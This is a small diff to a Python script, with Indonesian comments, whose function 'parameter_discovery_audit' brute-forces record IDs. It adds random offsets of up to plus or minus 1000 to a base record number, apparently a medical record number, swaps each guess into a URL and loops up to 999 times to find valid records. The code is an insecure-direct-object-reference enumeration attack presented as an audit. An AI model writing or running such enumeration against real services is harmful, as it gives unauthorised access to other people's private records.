@@ -188,11 +188,11 @@ def parameter_discovery_audit():
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
                     found_valid = False
-                    max_attempts = 999 # Mencoba hingga 50 kali untuk menemukan data valid
+                    max_attempts = 999 
                     
                     for attempt in range(1, max_attempts + 1):
-                        offset = random.randint(-300, 300)
-                        test_id = str(int(original_id) + offset).zfill(len(original_id))
+                        # Menghasilkan ID acak dalam rentang +/- 1000 dari base RM (MDA1MTA0ODE=)
+                        test_id = str(int(NO_RM) + random.randint(-1000, 1000)).zfill(len(original_id))
                         test_url = base_url.replace(original_id, test_id)
                         
                         # Heartbeat pencarian
